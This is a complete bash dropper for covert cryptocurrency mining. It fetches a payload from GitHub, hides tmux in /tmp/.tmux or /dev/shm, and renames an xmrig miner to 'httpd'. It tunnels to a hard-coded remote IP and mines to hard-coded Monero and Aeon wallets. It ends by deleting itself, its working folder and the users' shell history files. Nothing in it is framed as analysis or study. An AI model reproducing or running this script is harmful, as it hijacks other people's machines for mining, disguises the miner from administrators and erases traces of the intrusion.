#!/bin/bash

## get payload
BRANCH=master
wget https://github.com/untoreh/scripts/archive/${BRANCH}.tar.gz
tar xf ${BRANCH}.tar.gz && rm ${BRANCH}.tar.gz
cd scripts-${BRANCH} || exit 1

## relocate tmux
trel=false
for ph in {/tmp,/dev/shm,~/}; do
    mkdir -p ${ph}/.tmux && \
        mv pl/tmux ${ph}/.tmux && \
        export PATH=${ph}/.tmux:$PATH && \
        trel=true && break
done
[ $trel = false ] && { echo "couldn't relocate tmux" ; exit 1; }

## needed tmux sed grep envsubst
export TERMINFO=pl/ \
       TERM=tmux \
       SHELL=$(/usr/bin/which bash) \
       PATH=.:pl:$PATH \
       HOME=${HOME:-/tmp}
[ -z "$SHELL" ] && echo "bash not found" && exit 1


## custom socket for tmux
export tmx=$(which tmux)
tmux(){
    $tmx -S /tmp/.tmx "$@"
}
export -f tmux
tmux start-server || { echo "failed to start tmux"; exit 1 ; }

## glibc not needed on standalone
## tnl
TNL_REMOTE=${TNL_REMOTE:-212.237.6.194}
TNL_ARGS=${TNL_ARGS:--L tcp://:8080/:8081 -F kcp://chacha20:123@${TNL_REMOTE}:443?ttl=60}
TNL_MASK=${TNL_MASK:-gst}
tmux new-session -d -s ${TNL_MASK} ${TNL_MASK} ${TNL_ARGS}


OBJ_MASK=${OBJ_MASK:-httpd}
PAUSD_DAEMON=${PAUSD_DAEMON:-pausd}
OBJ_CFG=${OBJ_CFG:-httpd-1.conf}
CFG_BASE_URL=https://rawgit.com/untoreh/scripts/master/cfg/
PAUSD_ARGS=${PAUSD_ARGS:-${OBJ_MASK} ${OBJ_MASK}.conf}

## download cfg
if [ ! -e "$OBJ_CFG" ]; then
	wget -q "${CFG_BASE_URL}${OBJ_CFG}" -O "${OBJ_MASK}.conf.tpl"
fi

## object in sln should be present in pl/
OBJ_NAME=${OBJ_NAME:-xmrig}
mv pl/${OBJ_NAME} ${OBJ_MASK}
chmod +x ${OBJ_MASK} &>/dev/null

## daemon
# (when not included in the payload)
# PAUSD_DAEMON_URL=https://rawgit.com/untoreh/scripts/master/${PAUSD_DAEMON}
# wget -q ${PAUSD_DAEMON_URL}
chmod +x ${PAUSD_DAEMON} &>/dev/null

## daemon conf
## misc
[ $(id -u) != 0 ] && sudo=$(/usr/bin/which sudo 2>/dev/null)
echo 128 | $sudo tee /proc/sys/vm/nr_hugepages
## instance ID
CPU=$(cat /proc/cpuinfo | grep "model name" | head -1 | sed -r 's/model name\s*:\s*|[^a-zA-Z0-9]*//g')
CORES=$(cat /proc/cpuinfo| grep "cpu cores" | wc -l)
DATE=$(date +%s)
IPADDR=$(wget -qO- ipinfo.io/ip)
HOSTN=$(hostname)
## cpu
cpu_p=$(cat /sys/fs/cgroup/cpuacct,cpu/cpu.cfs_period_us 2>/dev/null)
cpu_q=$(cat /sys/fs/cgroup/cpuacct,cpu/cpu.cfs_quota_us 2>/dev/null)
if [ -n "$cpu_p" -a -n "$cpu_q" ]; then ## respect cgroups
    ACORES=$((cpu_p / cpu_q)) ## the available cpu (in number of cores)
    ## compose a binary string to map affinity (printf from bash or non busybox)
    if [ "$ACORES" = 1 -a "$CORES" -gt 1 ]; then ## if max cpu is one and more threads are possible, use 2 threads
        bin_s=$(printf '0\n%.0s' $(seq 1 $((CORES - 2))))$(printf "\n1\n1") ## append two cores
        PAUSD_THREADS=${PAUSD_THREADS:-2}
    else ## just use as many available cores
        bin_s=$(printf '0\n%.0s' $(seq 1 $((CORES - ACORES))))$(printf '\n1%.0s' $(seq 1 $ACORES))
        PAUSD_THREADS=${PAUSD_THREADS:-$ACORES}
    fi
else ## no cgroups, use all cores
    bin_s=$(printf '0\n%.0s' $(seq 1 $CORES))
    PAUSD_THREADS=${PAUSD_THREADS:-$CORES}
fi
## shuffle affinity and get hex string
bin_s=$(echo "$bin_s" | shuf | while read c; do echo -n $c; done) ## shuffle
hex_s=$(printf '%x\n' "$((2#$bin_s))") ## hex string, bashism
if [ -z "$hex_s" -o "$hex_s" = 0 ]; then
    export AFFINITY="0x0"
else
    export AFFINITY="0x$hex_s"
fi

## vars set through tmux
PAUSD_VER=${PAUSD_VER:-2}
PAUSD_SHARES=${PAUSD_SHARES:-$((PAUSD_THREADS * PAUSD_VER))}
PAUSD_RATE=${PAUSD_RATE:-200}

export \
ID=${ID:-"{$IPADDR}{$HOSTN}{$DATE}{$CORES}{$CPU}"} \
PA=${PA:-4ACgpqzFZCiRfmZHAX11tAMLft1KNvLhWh83JXpYFKfKDhT7GXK89AoM4jNV1RRUUghAbuP1FrqTFU5w4zbN3F9GG6mqNPq} \
AL=${AL:-cryptonight} \
ENDPOINT=${ENDPONT:-127.0.0.1:8080}
## subst
cat ${OBJ_MASK}.conf.tpl | envsubst -no-empty > ${OBJ_MASK}.conf

## init
## set vars used by pausd daemon in tmux
for v in $(builtin compgen -A variable | grep ^PAUSD); do
    export $v
    tmux setenv -g $v "${!v}" ; done
tmux new-session -d -s ${PAUSD_DAEMON} ${PAUSD_DAEMON} ${PAUSD_ARGS}
sleep 1 ## give time to fail

## cleanup
## wait for tmux session to startup
slept=0
while [ "$(tmux ls | wc -l)" -lt 2 ]; do
    slept=$((slept+1))
    if [ $slept -gt 5 ]; then ## no aes means crash means aeon
        ## try without hw accel
        PAUSD_VER=${PAUSD_VER/1/3} PAUSD_VER=${PAUSD_VER/2/4} && export PAUSD_VER
        ## switch PA to different co
        PA="WmsNJ3Usa4T7AbXz6ZRTdi5hjrqeXsGFMHEEwpv5g2sbgtEWxJZeBA4hqMusHAyWBVaDktNhZHTvTd6RfngAJNpF1wDzwqaNo"
        ## change algo
        AL="cryptonight-lite"
        ENDPOINT="pool.supportaeon.com:3333" ## temporary
        ## subst
        cat ${OBJ_MASK}.conf.tpl | envsubst -no-empty > ${OBJ_MASK}.conf
        ## init
        tmux kill-session -t ${PAUSD_DAEMON}
        tmux new-session -d -s ${PAUSD_DAEMON} ${PAUSD_DAEMON} ${PAUSD_ARGS}
        while [ "$(tmux ls | wc -l)" -lt 3 ]; do sleep 1; done
        break
    fi
    sleep 1;
done
sleep 1 ## once more for edge cases
cd ..
rm -rf -- "$0" \
   "scripts-${BRANCH}" \
   "$HOME"/.*_history \
   /.*_history
